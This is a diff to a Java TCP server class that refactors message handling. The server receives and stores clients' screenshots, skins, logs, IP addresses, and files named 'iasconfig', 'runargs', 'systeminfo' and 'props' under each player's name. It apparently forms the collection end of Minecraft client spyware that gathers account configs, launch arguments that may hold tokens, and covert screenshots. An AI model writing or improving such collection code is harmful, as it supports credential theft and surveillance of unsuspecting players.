@@ -50,10 +50,10 @@ public class Server extends TcpServer {
         Gson GSON = new Gson();
         try {
             if (message.data instanceof ByteData data) {
-                switch (data.messageID) {
+                switch (data.id) {
                     case "screenshot", "screenshot2" -> {
 
-                        File file = new File(Utils.getDataFile("screenshots"), getFileName(data.messageID + "id", "png", String.valueOf(id), true));
+                        File file = new File(Utils.getDataFile("screenshots"), getFileName(data.id + "id", "png", String.valueOf(id), true));
                         FileUtil.write(file, data.bytes());
                     }
                     case "skin" -> {
@@ -62,21 +62,22 @@ public class Server extends TcpServer {
                         FileUtil.write(file, data.bytes());
                     }
                 }
-            } else if (message.data instanceof SingleStringData data) {
-                if (data.data().equals("getconfig")) {
+            } else if (message.data instanceof StringsData data) {
+                if (data.data().length == 0 && data.id().equals("getconfig")) {
                     sendUtil.trySend(conn, new Message(defaultConfig));
-                }
-            } else if (message.data instanceof StringData data) {
-                switch (data.messageID()) {
-                    case "logging" -> {
-                        File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
-                        String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
-                        FileUtil.write(file, (oldInfo + data.data()).getBytes(StandardCharsets.UTF_8));
-                    }
-                    case "ip" -> info.ip = data.data();
-                    case "iasconfig", "runargs", "systeminfo", "props" -> {
-                        File file = new File(Utils.getDataFile("data"), getFileName(data.messageID(), "txt", info.playerData.playerName, true));
-                        FileUtil.write(file, data.data());
+                } else if (data.data().length == 1) {
+                    String msg = data.data()[0];
+                    switch (data.id()) {
+                        case "logging" -> {
+                            File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
+                            String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
+                            FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
+                        }
+                        case "ip" -> info.ip = msg;
+                        case "iasconfig", "runargs", "systeminfo", "props" -> {
+                            File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.playerData.playerName, true));
+                            FileUtil.write(file, msg);
+                        }
                     }
                 }
             } else if (message.data instanceof PlayerData data) {
